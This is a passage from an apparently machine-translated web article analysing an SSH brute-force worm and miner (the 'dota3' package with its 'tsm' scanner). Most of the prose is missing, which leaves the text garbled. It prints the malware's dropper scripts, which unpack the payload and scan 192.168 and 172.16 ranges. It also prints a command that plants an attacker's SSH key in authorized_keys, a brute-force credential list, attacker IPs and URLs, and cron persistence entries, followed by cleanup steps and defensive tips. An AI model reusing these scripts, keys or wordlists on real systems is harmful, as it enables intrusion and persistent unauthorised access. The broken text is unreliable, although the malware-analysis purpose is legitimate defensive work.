<p>      url: <code>http://www.minpop.com/sk12pack/idents.php</code>  <code>http://www.minpop.com/sk12pack/names.php</code>, ,   .</p><br>
<p>  ,           .</p><br>
<h3 id="skaner-brutforser">-</h3><br>
<p>   .  ,       <code>tsm</code>    ssh    N    .   ,     70 ip      .      (std, openssh, dns, resolv,pthread)   <code>x32</code>, <code>x64</code>, <code>armv7</code>.   ,          .          .</p><br>
<p>      </p><br>
<div class="spoiler"><b class="spoiler_title">help</b><div class="spoiler_text"><pre><code class="plaintext hljs">----------------------&gt;Faster than light&lt;-----------------------------<font></font>
---------------------&gt;use only for testing&lt;---------------------------<font></font>
Use: scan [OPTIONS] [[USER PASS]] FILE] [IPs/IPs Port FILE]<font></font>
        -t [NUMTHREADS]: Change the number of threads used. Default is %d<font></font>
        -m [MODE]: Change the way the scan works. Default is %d<font></font>
        -f [FINAL SCAN]: Does a final scan on found servers. Default is %d<font></font>
        Use -f 1 for A.B class /16. Default is 2 for A.B.C /24<font></font>
        -i [IP SCAN]: use -i 0 to scan ip class A.B. Default is %d<font></font>
        if you use -i 0 then use ./scan -p 22 -i 0 p 192.168 as agrument for ip file<font></font>
        -m 0 for non selective scanning<font></font>
        -P 0 leave default password unchanged. Changes password by default.<font></font>
        -s [TIMEOUT]: Change the timeout. Default is %ld<font></font>
        -S [2ndTIMEOUT]: Change the 2nd timeout. Default is %ld<font></font>
        -p [PORT]: Specify another port to connect to. 0 for multiport<font></font>
        -c [REMOTE-COMMAND]: Command to execute on connect. Use ; or &amp;&amp; with commands<font></font>
Use: ./scan -t 202 -s 5 -S 5 p ip -c "uname"<font></font>
Use: ./scan -t 202 -s 5 -S 5 -i 0 -p 22 p 192.168<font></font>
The example above will scan 192.168 port 22 and brute force the IP list.<font></font>
Use: ./scan -t 202 -s 5 -S 5 -p 0 p ip - for "ip port" file<font></font>
Use: ./scan -t 202 -s 5 -S 5 -p 23 -m 0 p ip - for other protocols<font></font>
When using -m 1 (default value) the scan will only target full linux<font></font>
machines or windows machines with openssh installed. Routers, busyboxes<font></font>
honeypots and other limited linux devices will be skipped from the output.<font></font>
Use -m 0 for non-selective scanning (can be used for all type of ssh devices)<font></font>
this includes busyboxes, routers, honeypots and other devices with limited<font></font>
commands. ================================================================<font></font>
==========================================================================</code></pre></div></div><br>
<div class="spoiler"><b class="spoiler_title">  base64  ,  1</b><div class="spoiler_text"><pre><code class="plaintext hljs">#!/bin/bash<font></font>
cd /tmp <font></font>
rm -rf .ssh<font></font>
rm -rf .mountfs<font></font>
rm -rf .X13-unix<font></font>
rm -rf .X17-unix<font></font>
rm -rf .X19-unix<font></font>
mkdir .X19-unix<font></font>
cd .X19-unix<font></font>
mv /var/tmp/dota3.tar.gz dota3.tar.gz<font></font>
tar xf dota3.tar.gz<font></font>
sleep 3s &amp;&amp; cd .rsync; cat /tmp/.X19-unix/.rsync/initall | bash 2&gt;1&amp;<font></font>
sleep 45s &amp;&amp; pkill -9 run &amp;&amp; pkill -9 go &amp;&amp; pkill -9 tsm<font></font>
exit 0</code></pre></div></div><br>
<div class="spoiler"><b class="spoiler_title">  base64  ,   </b><div class="spoiler_text"><pre><code class="plaintext hljs">#!/bin/bash<font></font>
cd /tmp <font></font>
rm -rf .ssh<font></font>
rm -rf .mountfs<font></font>
rm -rf .X13-unix<font></font>
rm -rf .X17-unix<font></font>
rm -rf .X19-unix<font></font>
mkdir .X19-unix<font></font>
cd .X19-unix<font></font>
mv /var/tmp/dota3.tar.gz dota3.tar.gz<font></font>
tar xf dota3.tar.gz<font></font>
sleep 3s &amp;&amp; cd /tmp/.X19-unix/.rsync/c<font></font>
nohup /tmp/.X19-unix/.rsync/c/tsm -t 150 -S 6 -s 6 -p 22 -P 0 -f 0 -k 1 -l 1 -i 0 /tmp/up.txt 192.168 &gt;&gt; /dev/null 2&gt;1&amp;<font></font>
sleep 8m &amp;&amp; nohup /tmp/.X19-unix/.rsync/c/tsm -t 150 -S 6 -s 6 -p 22 -P 0 -f 0 -k 1 -l 1 -i 0 /tmp/up.txt 172.16 &gt;&gt; /dev/null 2&gt;1&amp;<font></font>
sleep 20m &amp;&amp; cd ..; /tmp/.X19-unix/.rsync/initall 2&gt;1&amp;<font></font>
exit 0</code></pre></div></div><br>
<div class="spoiler"><b class="spoiler_title">C  ssh </b><div class="spoiler_text"><pre><code class="plaintext hljs">cd ~ &amp;&amp; rm -rf .ssh &amp;&amp; mkdir .ssh &amp;&amp; echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"&gt;&gt;.ssh/authorized_keys &amp;&amp; chmod -R go= ~/.ssh &amp;&amp; cd ~</code></pre></div></div><br>
<p>    ip  <code>45.9.148.129</code>  <code>45.9.148.125</code>,   .</p><br>
<p>    — ,    .</p><br>
<div class="spoiler"><b class="spoiler_title">  </b><div class="spoiler_text"><pre><code class="plaintext hljs">jabez jabez<font></font>
admin smiles<font></font>
root campbell<font></font>
jawad jawad<font></font>
test $$$$$$$$<font></font>
root wangjianjun<font></font>
sdtdserver sdtdserver<font></font>
idea idea<font></font>
foundry 123456<font></font>
citlalli citlalli<font></font>
root sensor123<font></font>
info info333<font></font>
kaasen kaasen<font></font>
root Million2017<font></font>
jakayla jakayla<font></font>
edineide edineide<font></font>
wikre wikre<font></font>
guest edges<font></font>
games nobody123<font></font>
vcsa hhhhhhh<font></font>
root sq<font></font>
root root@1234567890<font></font>
ftpuser password!<font></font>
web nobody0000<font></font>
root jyy<font></font>
mysql chelu<font></font>
charming 123456<font></font>
web web1111<font></font>
pscsec pscsec<font></font>
root michell<font></font>
louhellen louhellen<font></font>
xgridagent xgridagent<font></font>
alligator alligator<font></font>
root subrosa<font></font>
denny password<font></font>
ftp 1220<font></font>
rival rival<font></font>
root 9i8u7y<font></font>
root general1<font></font>
smenes smenes<font></font>
root password@1234567890<font></font>
support testing<font></font>
root 123asdfghjkl<font></font>
smmsp 12330<font></font>
root fladvert<font></font>
picher picher<font></font>
backup farrell<font></font>
hung root2root<font></font>
guest shinobu<font></font>
sacre sacre123</code></pre></div></div><br>
<p>  ,        <code>dota3.tar.gz</code>,           .     . ,    .        ,   .</p><br>
<h3 id="lancher"></h3><br>
<p>  ,      cron   .   <code>/var/spool/cron/crontabs/&lt;username&gt;</code>     </p><br>
<div class="spoiler"><b class="spoiler_title"> cron</b><div class="spoiler_text"><pre><code class="plaintext hljs">0 0 */3 * * /dev/shm/.lwp/.rsync/a/upd&gt;/dev/null 2&gt;&amp;1<font></font>
5 8 * * 0 /dev/shm/.lwp/.rsync/b/sync&gt;/dev/null 2&gt;&amp;1<font></font>
@reboot /dev/shm/.lwp/.rsync/b/sync&gt;/dev/null 2&gt;&amp;1<font></font>
0 0 */3 * * /dev/shm/.lwp/.rsync/c/aptitude&gt;/dev/null 2&gt;&amp;1</code></pre></div></div><br>
<p>     ,   .</p><br>
<h2 id="pora-pokonchit-s-etim-bezobraziem">    !</h2><br>
<p>    ,    .         .</p><br>
<p> cron  </p><br>
<pre><code class="plaintext hljs">rm -rf /var/spool/cron/crontabs/&lt;username&gt;</code></pre><br>
<p>  </p><br>
<pre><code class="bash hljs">pkill -u &lt;username&gt;</code></pre><br>
<p>  ssh </p><br>
<pre><code class="plaintext hljs">rm /home/&lt;username&gt;/.ssh/authorized_keys</code></pre><br>
<p>  </p><br>
<pre><code class="plaintext hljs">rm -rf /dev/shm/.lwp</code></pre><br>
<p>               .  ,    .</p><br>
<h2 id="chto-delat-s-zablokirovannym-ip-adresom">    IP ?</h2><br>
<p>      ,          ,    .     IP    .        ,          .   -         ?</p><br>
<h2 id="kakaya-sistema-uyazvima-dlya-podobnoy-ataki">     </h2><br>
<p> ,  Linux ,      ssh    .  ,       .   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow">   Azure   2019</a></p><br>
<h2 id="kak-zaschititsya-ot-podobnyh-atak">    ?</h2><br>
<ul>
<li>      </li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow">  </a>   </li>
<li> <code>fail2ban</code>  rate limit  ssh  <code>ufw</code>    </li>
<li>   ssh    IP </li>
<li>    shell  ,     </li>
</ul><br>
<p><strong>UPD</strong> </p><br>
<ul>
<li>   ,    ssh   </li>
</ul><br>
<h2 id="analitika-i-sluchai-zarazheniya-pohozhimi-shtammami">     </h2><br>
<ul>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow">   Azure   2019</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow">   TrendMicro</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kodiシステムのユーザーによる感染</font></font></a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ジョーサンドボックス分析</font></font></a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VirusTotal分析</font></font></a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Graboidと呼ばれる同様のワームの説明</font></font></a></li>
</ul></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja482772/index.html">2020年のプログレッシブWebアプリケーション</a></li>
<li><a href="../ja482774/index.html">黒ソシニキと最高のプロモーション方法。大人、薬局、エッセイ、デート。シェスタコフ| People PRO＃75</a></li>
<li><a href="../ja482776/index.html">高さマップと視差</a></li>
<li><a href="../ja482778/index.html">アパートの回復と換気。ダクトとSMSなし</a></li>
<li><a href="../ja482780/index.html">地震データに基づくニューラルネットワークの実験</a></li>
<li><a href="../ja482786/index.html">未解決の謎</a></li>
<li><a href="../ja482788/index.html">Google Coral Edge TPUの内容：速度のテストとデバイスの解析</a></li>
<li><a href="../ja482790/index.html">準同型暗号化を忘れる：今では機能的な暗号化があります</a></li>
<li><a href="../ja482792/index.html">2019年のITERプロジェクト</a></li>
<li><a href="../ja482794/index.html">ニューラルネットワーク。それはすべてどこに行きますか</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>